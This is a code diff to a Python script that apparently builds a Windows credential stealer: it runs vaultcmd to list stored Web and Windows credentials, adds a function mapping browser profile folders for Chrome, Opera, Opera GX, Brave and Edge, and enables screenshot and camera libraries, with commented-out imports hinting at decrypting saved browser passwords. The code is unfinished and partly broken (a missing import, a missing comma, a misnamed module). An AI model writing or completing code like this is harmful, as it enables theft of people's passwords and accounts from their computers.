@@ -1,7 +1,8 @@
-# import requests
+import requests
 import os
 import subprocess
-
+import pyautogui
+import cV2
 # import socket
 # import sqlite3
 # import win32crypt
@@ -14,8 +15,7 @@ import subprocess
 # import re
 # import pandas
 # import shutil
-# import cV2
-# import pyautogui
+
 # import zipfile
 
 def GetPath():
@@ -23,12 +23,23 @@ def GetPath():
     print(os.getcwd())
     print()
 
-# command1 = "runas /noprofile /user:administrator cmd";
+def GetCreds():
+    local = getenv('LOCALAPPDATA')
+    roaming = getenv('APPDATA')
+
+    paths = {
+
+    'Google Chrome': local + '\\Google\\User Data\\Default',
+    'Opera': roaming +  '\\Opera Software\\Opera Stable',
+    'Opera GX': roaming + '\\Opera GX Software\\Opera GX Stable',
+    'Brave': local + '\\Brave Software\\Brave-Browser\\User Data\\Default'
+    'Edge': local + '\\Microsoft\\Edge\\User Data\\Default'
+    
+    }
+
 
 command1 = "vaultcmd /listcreds:'Web Credentials' /all";
 command2 = "vaultcmd /listcreds:'Windows Credentials' /all";
-
-
 
 
 subprocess.Popen(command1, shell=True)
